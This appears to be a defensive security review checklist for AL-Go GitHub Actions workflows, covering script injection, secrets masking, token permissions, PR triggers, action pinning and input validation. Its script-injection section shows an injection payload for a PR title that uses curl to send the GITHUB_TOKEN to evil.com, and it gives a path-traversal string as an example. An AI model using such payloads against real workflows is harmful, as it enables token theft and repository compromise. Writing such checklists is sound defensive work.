# Security Review Checklist

When reviewing AL-Go code changes, check for these security concerns.

## Script Injection

Script injection is one of the most common security vulnerabilities in GitHub Actions. It occurs
when untrusted input (from PR titles, branch names, issue bodies, commit messages, etc.) flows
into `run:` blocks via `${{ }}` expressions, allowing attackers to execute arbitrary commands.

**Dangerous contexts** — these should NEVER appear directly in `run:` blocks:

- `github.event.issue.title`, `github.event.issue.body`
- `github.event.pull_request.title`, `github.event.pull_request.body`
- `github.event.comment.body`
- `github.event.*.head_ref`, `github.event.*.default_branch`
- `github.event.*.email`, `github.event.*.name`
- Any context ending in `body`, `title`, `message`, `name`, `ref`, `label`, `head_ref`

**Bad** — direct interpolation in a shell script:

```yaml
run: |
  title="${{ github.event.pull_request.title }}"
  echo "Processing $title"
```

An attacker can set the PR title to `a"; curl http://evil.com?t=$GITHUB_TOKEN;#` and steal the token.

**Good** — use an intermediate environment variable:

```yaml
env:
  TITLE: ${{ github.event.pull_request.title }}
run: |
  echo "Processing $TITLE"
```

AL-Go's pattern is to pass inputs via `env:` blocks and reference them as `$ENV:_variableName`
in PowerShell. Verify new code follows this pattern. Even `${{ inputs.X }}` should use env vars
if the input could contain attacker-controlled content.

**Also check**: `${{ github.action_path }}` in `run:` blocks is safe (controlled by the action
definition), but `${{ github.head_ref }}` or `${{ github.event.pull_request.head.ref }}` are NOT
(attacker controls the branch name).

## Secrets Handling

### Never log secrets

- Secrets must never be written to logs — use `MaskValue` or `::add-mask::` to mask sensitive values
- AL-Go masks secrets in three forms: raw, character-escaped, and Base64-encoded (see `ReadSecretsHelper.psm1`)
- When a secret is **transformed** (decoded, concatenated, Base64-encoded), the new value must also
  be registered as a secret with `::add-mask::` — automatic redaction only covers the original value
- Watch for secrets leaking in error messages — `catch` blocks that log `$_.Exception.Message` may
  include the secret if it was part of a URL or command

### Avoid structured data as secrets

- Structured data (JSON, XML, YAML) as a secret can cause redaction to fail because GitHub relies
  on exact string matching. Prefer individual secrets for each sensitive value when possible
- AL-Go does use structured secrets today (e.g., JSON blobs for environment credentials), so this
  is not a hard rule — but be aware of the redaction limitation and ensure transformed/extracted
  values are explicitly masked with `::add-mask::`

### Passing secrets to actions

- Secrets in workflows must use `${{ secrets.X }}` — never hardcode or pass as plain text
- Action parameters that receive secrets should suppress `PSAvoidUsingPlainTextForPassword` with a
  clear `Justification` string
- Prefer passing secrets via environment variables over action inputs when possible

### Credential permissions

- Use the minimum permissions required. Prefer `GITHUB_TOKEN` over PATs
- For cross-repository access, the preference order is: `GITHUB_TOKEN` → deploy key → GitHub App → fine-grained PAT. Never use classic PATs
- When generating tokens, select the fewest scopes/permissions necessary

## GITHUB_TOKEN and Workflow Permissions

- Every workflow must declare explicit `permissions` following least-privilege
- Flag `read-all` and `write-all` — these are overly broad and should be broken down
- Job-level permissions override workflow-level — verify job-level permissions don't accidentally
  escalate or drop needed access
- The `GITHUB_TOKEN` expires after the job completes, but an attacker with runner access can
  exfiltrate it and use it in real-time. Restrict permissions to limit blast radius

## Pull Request Trigger Security

- `PullRequestTrigger` defaults to `pull_request` (not `pull_request_target`) for security
- `pull_request` from forks runs with **read-only** permissions and **no access to secrets** — this
  is the safe default
- `pull_request_target` runs in the context of the **base** repository with full secrets access —
  only use when absolutely necessary and never checkout the PR head code in that context
- `VerifyPRChanges` blocks changes to `.AL-Go` folders, scripts (`.ps1`, `.psm1`), workflows
  (`.yml`, `.yaml`), `.github/` folder, and `CODEOWNERS` from fork PRs
- Workflows triggered by `issue_comment`, `issues`, or `push` have access to secrets — be extra
  careful with untrusted input in these triggers

## Compromised Runner Risks

When reviewing code that runs on runners, consider what an attacker could do if they execute
malicious code (e.g., via a compromised dependency or script injection):

- **Secrets access**: Any secret set as an env var can be read with `printenv`. Secrets used in
  expressions are written to the generated shell script on disk
- **Token theft**: `GITHUB_TOKEN` can be exfiltrated and used before the job completes
- **Data exfiltration**: Repository contents, build artifacts, and secrets can be sent to external
  servers via HTTP
- **Repository modification**: If `GITHUB_TOKEN` has write permissions, the attacker can modify
  repo contents, releases, and more

Self-hosted runners are especially risky because they can be **persistently compromised** — unlike
GitHub-hosted runners which are ephemeral. Never use self-hosted runners for public repositories.

## Third-Party Action Pinning

- Actions should be pinned to a **full-length commit SHA** — this is the only immutable reference
- Pinning to a tag (e.g., `@v3`) is convenient but risky — tags can be moved or deleted
- AL-Go pins external actions by SHA with a comment showing the version:
  `actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2`
- Flag any new third-party action references that use branch names or mutable tags without SHA

## Template Safety

- Template files in `Templates/` must stay generic — no hardcoded repo-specific references,
  organization names, or environment-specific values
- Files added to templates must not override user config (avoid default names that could conflict)
- Changes to one template directory (`Per Tenant Extension/`) usually need mirroring in the other
  (`AppSource App/`)

## Input Validation

- Workflow inputs should have sensible defaults and descriptions
- New workflow inputs need validation (see `Actions/ValidateWorkflowInput/`)
- Validate and sanitize external inputs before use in file operations, API calls, or shell commands
- Check for path traversal vulnerabilities — verify that user-supplied paths can't escape the
  intended directory (e.g., `../../../etc/passwd`)
